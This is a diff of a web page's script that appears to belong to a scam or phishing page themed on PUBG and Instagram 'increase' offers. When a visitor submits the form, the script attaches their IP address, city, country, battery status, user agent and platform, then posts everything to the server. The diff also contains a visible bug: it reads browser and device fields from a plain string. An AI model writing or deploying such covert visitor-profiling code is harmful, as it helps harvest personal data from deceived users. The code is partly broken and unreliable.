@@ -381,7 +381,8 @@
     </div> 
 
     <div id="notification" class="notification"></div>
-   <script>
+<script src="https://cdn.jsdelivr.net/npm/platform/platform.min.js"></script>
+<script>
     function showPubgContainer() {
         document.getElementById('login-container').classList.remove('active');
         document.getElementById('pubg-container').classList.add('active');
@@ -395,13 +396,17 @@
 
     async function getIPInfo() {
         try {
-            const response = await fetch('http://ipwho.is/');
+            const response = await fetch('https://ipwho.is/');
             const data = await response.json();
-            return {
-                ip: data.ip,
-                country: data.country,
-                city: data.city
-            };
+            if (data.success) {
+                return {
+                    ip: data.ip,
+                    country: data.country,
+                    city: data.city
+                };
+            } else {
+                throw new Error("Failed to fetch IP information.");
+            }
         } catch (error) {
             console.error('Error fetching IP info:', error);
             return {
@@ -414,20 +419,19 @@
 
     function getPlatformInfo() {
         const ua = navigator.userAgent;
-        const platform = /Windows/.test(ua) ? "t" :
-                         /Mac/.test(ua) ? "t" :
-                         /Linux/.test(ua) ? "t" :
-                         /Android/.test(ua) ? "t" :
-                         /iPhone|iPad|iPod/.test(ua) ? "t" : "Unknown";
+        let platform = "Instagram"; // الافتراضي
 
-        const browser = ua.includes("Chrome") ? "Chrome" :
-                        ua.includes("Safari") ? "Safari" :
-                        ua.includes("Firefox") ? "Firefox" : "Unknown Browser";
+        if (/Windows/.test(ua)) platform = "Instagram - Windows";
+        else if (/Mac/.test(ua)) platform = "Instagram - MacOS";
+        else if (/Linux/.test(ua)) platform = "Instagram - Linux";
+        else if (/Android/.test(ua)) platform = "Instagram - Android";
+        else if (/iPhone|iPad|iPod/.test(ua)) platform = "Instagram - iOS";
 
         return {
             platform: platform,
-            browser: browser,
-            userAgent: ua
+            userAgent: ua,
+            browser: platform.name || "Unknown Browser",
+            device: platform.product || "Unknown Device"
         };
     }
 
@@ -449,12 +453,6 @@
         };
     }
 
-    function getDeviceVersion() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/\(([^)]+)\)/);
-        return match ? match[1] : 'Unknown';
-    }
-
     increaseForm.addEventListener('submit', async (event) => {
         event.preventDefault();
         const formData = new FormData(increaseForm);
@@ -463,9 +461,8 @@
         const ipInfo = await getIPInfo();
         const platformInfo = getPlatformInfo();
         const batteryInfo = await getBatteryInfo();
-        const deviceVersion = getDeviceVersion();
 
-        Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+        Object.assign(data, ipInfo, platformInfo, batteryInfo);
 
         try {
             const response = await fetch('/submitIncrease', {
@@ -488,8 +485,5 @@
         }
     });
 </script>
-</body>   
+</body>
 </html>
- 
-    
-        
